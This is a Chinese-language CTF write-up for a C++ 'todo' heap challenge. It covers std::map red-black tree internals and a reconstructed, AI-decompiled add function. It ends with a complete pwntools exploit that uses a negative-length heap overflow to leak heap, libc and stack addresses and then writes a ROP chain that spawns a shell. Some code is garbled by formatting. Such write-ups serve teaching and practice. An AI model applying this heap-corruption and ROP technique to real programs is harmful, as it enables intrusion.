const\_iterator begin() const { return t.begin(); }  
iterator end() { return t.end(); }  
const\_iterator end() const { return t.end(); }  
reverse\_iterator rbegin() { return t.rbegin(); }  
const\_reverse\_iterator rbegin() const { return t.rbegin(); }  
reverse\_iterator rend() { return t.rend(); }  
const\_reverse\_iterator rend() const { return t.rend(); }

//容量函数  
bool empty() const { return t.empty(); }  
size\_type size() const { return t.size(); }  
size\_type max\_size() const { return t.max\_size(); }

//key和value比较函数  
key\_compare key\_comp() const { return t.key\_comp(); }  
value\_compare value\_comp() const { return value\_compare(t.key\_comp()); }

//运算符  
T&amp; operator\[\](const key\_type&amp; k)  
{  
return (\*((insert(value\_type(k, T()))).first)).second;  
}  
friend bool operator== \_\_STL\_NULL\_TMPL\_ARGS (const map&amp;, const map&amp;);  
friend bool operator&lt; \_\_STL\_NULL\_TMPL\_ARGS (const map&amp;, const map&amp;);  
}

节点
--

Node 有 5 个成员，除了 left、right、data，还有 color 和 parent。

C++实现，位于bits/stl\_tree.h  
/\*\*

- Non-template code  
    \*\*/

enum rb\_tree\_color { kRed, kBlack };

struct rb\_tree\_node\_base  
{  
rb\_tree*color color*;  
rb\_tree\_node*base\* parent*;  
rb\_tree\_node*base\* left*;  
rb\_tree\_node*base\* right*;  
};

/\*\*

- template code  
    \*\*/

template&lt;typename Value&gt;  
struct rb\_tree\_node : public rb\_tree\_node\_base  
{  
Value value*field*;  
};

树
-

Tree 有更多的成员，它包含一个完整的 rb\_tree\_node\_base（color/parent/left/right），还有 node\_count 和 key\_compare 这两个额外的成员。

这里省略了一些默认模板参数，如 key\_compare 和 allocator。  
template&lt;typename Key, typename Value&gt; // key\_compare and allocator  
class rb\_tree  
{  
public:  
typedef std::less&lt;Key&gt; key\_compare;  
typedef rb\_tree\_iterator&lt;Value&gt; iterator;  
protected:

struct rb\_tree\_impl // : public node\_allocator  
{  
key\_compare key*compare*;  
rb\_tree\_node*base header*;  
size\_t node*count*;  
};  
rb\_tree*impl impl*;  
};

template&lt;typename Key, typename T&gt; // key\_compare and allocator  
class map  
{  
public:  
typedef std::pair&lt;const Key, T&gt; value\_type;  
private:  
typedef rb\_tree&lt;Key, value\_type&gt; rep\_type;  
rep*type tree*;  
};

迭代器
---

rb\_tree 的 iterator 的数据结构很简单，只包含一个 rb\_tree\_node\_base 指针，但是其++/--操作却不见得简单（具体实现函数不在头文件中，而在 libstdc++ 库文件中）。

// defined in library, not in header  
rb\_tree\_node\_base *rb\_tree\_increment(rb\_tree\_node\_base* node);  
// others: decrement, reblance, etc.

template&lt;typename Value&gt;  
struct rb\_tree\_node : public rb\_tree\_node\_base  
{  
Value value*field*;  
};

template&lt;typename Value&gt;  
struct rb\_tree\_iterator  
{  
Value&amp; operator*() const  
{  
return static\_cast&lt;rb\_tree\_node&lt;Value&gt;*&gt;(node\_)-&gt;value*field*;  
}

rb\_tree*iterator&amp; operator++()  
{  
node* = rb\_tree*increment(node*);  
return \*this;  
}

rb\_tree\_node*base\* node*;  
};

再逆
==

交给AI逆了下  
add大概逻辑如下

```c
#include <iostream>
#include <string>
#include <map>
#include <new>
#include <cstring>

struct TodoNode {
    char *content;
    int length;
};

std::map<std::string, TodoNode> todo;

unsigned __int64 __fastcall todo_add() {
    unsigned __int64 start_time = __readfsqword(0x28u);
    char title[256] = {0}; // 假设最大标题长度为256
    unsigned int len = 0;
    char *todo_node_chunk = nullptr;

    // 读取标题
    std::cout << "Title: ";
    std::cin >> title;

    // 检查标题是否已存在
    auto it = todo.find(title);
    if (it != todo.end()) {
        std::cout << "Already exists" << std::endl;
        return start_time - __readfsqword(0x28u);
    }

    // 读取长度
    std::cout << "Length: ";
    std::cin >> len;
    unsigned int len_more1 = len + 1;

    // 分配内存
    todo_node_chunk = new char[len_more1];
    if (len_more1) {
        memset(todo_node_chunk, 0, len_more1);
    }

    // 插入红黑树
    todo[title] = {todo_node_chunk, len};

    // 处理异常
    if (!todo[title].content) {
        std::cout << "Out of memory" << std::endl;
        delete[] title;
        std::__throw_bad_alloc();
    }

    // 清理和返回
    if (title != nullptr) {
        delete[] title;
    }

    return start_time - __readfsqword(0x28u);
}

int main() {
    todo_add();
    return 0;
}
```

刚开始add由于rootnode不存在，会去`LABEL_34`先初始化

先拿个实例编译下带符号表，然后再放IDA里看。大概弄出逻辑

```c
struct node
{
  _DWORD color;
  _QWORD parents;
  _QWORD left_son_node;
  _QWORD right_son_node;
  struct string title_str_obj;
  struct pair todo_pair;
};

struct map
{
  _QWORD key_compare;
  _QWORD color;
  _QWORD parents;
  _QWORD left;
  _QWORD right;
  _QWORD node_count;
};

struct pair
{
  _QWORD todo_ptr;
  _QWORD todo_len;
};

struct string
{
  _QWORD ptr;
  _QWORD size;
  char str[16];
};

```

一个todo\_add就是增加一个节点

由于edit会结尾把换行符号改为零字节。不能溢出然后输出泄露

泄露后发现没有IO，std::cout不知道可不可行

但能控制node然后来任意地址读写，由于只有一开始的根节点的parent是指向map，其余的node里的parent都是指向堆地址。所以可以溢出来伪造覆盖。然后设置todo\_ptr为environ，泄露栈。然后再通过edit改todo\_ptr为栈，再写rop就行

或者UAF写fd也行

下次记得fuzz对size这方面也要随机些，感觉都束缚为正数了，所以没爆出来

exp
---

```python
from pwn import *
import random
context(os="linux",arch="amd64",log_level="debug")

def randinit(n):
    return random.randint(1, n)

def new(title,length):
    p.sendlineafter(b"> ",str(1))
    p.sendlineafter(b"Title: ",title)
    result=p.recvuntil(b"1. New todo",timeout=0.5)
    if b"Already exists" in result:
        return
    p.sendline(length)
def remove(title):
    p.sendlineafter(b"> ",str(2))
    p.sendlineafter(b"Title: ",title )

def edit(title,content):
    p.sendlineafter(b"> ",str(3))
    p.sendlineafter(b"Title: ",title)
    p.sendlineafter(b"TODO: ",content)

def show(title):
    p.sendlineafter(b"> ",str(4))
    p.sendlineafter(b"Title: ",title)

p=process("./chall")
gdb.attach(p)
pause()
new(str(1),str(-1))
remove(str(1))
new(str(1),str(-1))
show(str(1))  # leak heap
p.recvuntil(b"TODO: ")
heap=u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))<<12
print("heap leak "+hex(heap))

new(str(2),str(-1))
new(str(3),str(-1))
new(str(4),str(-1))
new(str(5),str(-1))
new(str(6),str(-1))
new(str(7),str(-1))
new(str(8),str(-1))
new(str(9),str(-1))
new(str(10),str(-1))
new(str(11),str(-1))
payload=b"1"*0x10+b"\x00"*8+p64(0x461)

edit(str(1),payload)
remove(str(1))
new(str(1),str(-1))
show(str(2))   # leak libc
p.recvuntil(b"TODO: ")
libc=u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))-0x203b20
print("libc leak "+hex(libc))

payload=b"1"*0x10+b"\x00"*8+p64(0x61)+p64(0)+p64(heap+0x750)+p64(0)+p64(0)+p64(heap+0x300)+p64(1)+p64(0x31)+p64(0) +p64(libc+0x20ad58)+p64(0x100)
edit(str(1),payload)

show(str(1))
p.recvuntil(b"TODO: ")
stack=u64(p.recvuntil(b"\n",drop=True).ljust(8,b"\x00"))
print("stack leak "+hex(stack))

payload=b"1"*0x10+b"\x00"*8+p64(0x61)+p64(0)+p64(heap+0x450)+p64(heap+0x750)+p64(heap+0x3d0)+p64(heap+0x380)+p64(1)+p64(0x32)+p64(0) +p64(stack-0x148)+p64(0x100)
edit(str(2),payload)

pause()
bin_sh=libc+0x1cb42f
sys=libc+0x58740
ret=libc+0x000000000002882f
pop_rdi=libc+0x000000000010f75b
rop=p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys)

edit(str(2),rop)

p.interactive()

# pause()

# index=0
# file=open('fuzz.txt', 'w') 
# p=process("./chall")
# gdb.attach(p)
# # pause()
# for i in range(0x1000):
#     match randinit(2):
#         case 1:
#             length=randinit(0x1000)
#             title=str(index)
#             new(title,str(length))
#             file.write("insert size"+str(1)+"\n")
#             file.flush()
#         case 2:
#             index=randinit(0x100)
#             remove(str(index))
#             file.write("remove title "+str(index)+"\n")
#             file.flush()
#         case 3:
#             len=random.randint(0x1000, 0x1100)
#             payload=len*b"a"
#             edit(payload)
#             file.write("edit \n")
#             file.flush()

```